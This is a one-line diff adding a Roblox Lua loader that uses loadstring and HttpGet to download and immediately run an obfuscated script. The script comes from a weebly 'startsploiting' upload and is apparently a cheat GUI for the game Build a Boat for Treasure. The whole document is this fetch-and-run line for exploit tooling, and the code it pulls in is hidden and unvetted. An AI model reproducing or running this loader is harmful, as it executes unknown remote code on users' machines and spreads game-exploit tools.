@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://startsploiting.weebly.com/uploads/1/3/1/5/131560940/obfuscated_93d91a9_build_a_boat_for_treasure_free_simple_gui.txt", true))()
